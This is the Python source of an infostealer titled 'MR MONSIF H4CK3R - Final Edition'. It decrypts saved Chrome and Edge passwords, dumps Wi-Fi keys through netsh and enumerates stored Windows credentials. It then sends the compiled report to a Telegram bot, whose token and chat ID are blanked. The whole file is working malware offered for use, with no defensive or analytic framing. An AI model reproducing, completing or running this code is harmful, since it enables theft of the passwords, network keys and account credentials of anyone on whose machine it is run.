# MR MONSIF H4CK3R - Final Edition
import os
import sys
import json
import base64
import sqlite3
import shutil
import socket
import platform
import subprocess
import requests
import datetime
from win32 import win32crypt
import win32cred
from Crypto.Cipher import AES

# --- teleeeeeeeeeg ---
BOT_TOKEN = '.................................................'
CHAT_ID = '...................'

# --- jigi jegi hhhhhhhhh ---
def get_chrome_datetime(chromedate):
    return datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=chromedate)

def get_encryption_key(browser_path):
    try:
        with open(os.path.join(browser_path, "Local State"), "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        payload = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        try:
            return win32crypt.CryptUnprotectData(password, None, None, None, 0)[1].decode()
        except:
            return "Decryption Failed"

def extract_browser_passwords(browser_name, path):
    results = []
    key = get_encryption_key(os.path.dirname(path))
    login_db = os.path.join(path, "Login Data")
    if not os.path.exists(login_db):
        return results
    temp_db = os.path.join(os.environ["TEMP"], "temp_browser.db")
    shutil.copy2(login_db, temp_db)
    try:
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
        for row in cursor.fetchall():
            url, username, password, date_created = row
            if password:
                decrypted = decrypt_password(password, key)
                results.append(f"[{browser_name}] {url}\nUsername: {username}\nPassword: {decrypted}\nDate: {get_chrome_datetime(date_created)}\n")
        conn.close()
        os.remove(temp_db)
    except:
        pass
    return results

def get_wifi_passwords():
    try:
        output = subprocess.check_output("netsh wlan show profiles", shell=True).decode()
        profiles = [line.split(":")[1].strip() for line in output.split("\n") if "All User Profile" in line]
        result = []
        for profile in profiles:
            try:
                info = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True).decode()
                password_line = [line for line in info.split("\n") if "Key Content" in line]
                password = password_line[0].split(":")[1].strip() if password_line else "None"
                result.append(f"[WiFi] {profile}: {password}")
            except:
                pass
        return result
    except:
        return []

def get_windows_credentials():
    results = []
    try:
        creds = win32cred.CredEnumerate(None, 0)
        for cred in creds:
            target = cred.get("TargetName", "")
            user = cred.get("UserName", "")
            password = cred.get("CredentialBlob", b"").decode("utf-16") if cred.get("CredentialBlob") else ""
            results.append(f"[WIN] {target} | {user} | {password}")
    except:
        pass
    return results

def send_to_telegram(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": text}
        requests.post(url, data=payload)
    except:
        pass

# --- 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999 ---
def main():
    report = f"📡 CREDENTIALS REPORT - {socket.gethostname()} ({platform.system()})\n\n"

    for browser, path in {
        "Chrome": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default"),
        "Edge": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default")
    }.items():
        creds = extract_browser_passwords(browser, path)
        if creds:
            report += "\n".join(creds) + "\n"

    wifi = get_wifi_passwords()
    if wifi:
        report += "\n".join(wifi) + "\n"

    win_creds = get_windows_credentials()
    if win_creds:
        report += "\n".join(win_creds) + "\n"

    send_to_telegram(report[:4000])  # Telegram limit
    if len(report) > 4000:
        for i in range(4000, len(report), 4000):
            send_to_telegram(report[i:i+4000])

if __name__ == "__main__":
    main()
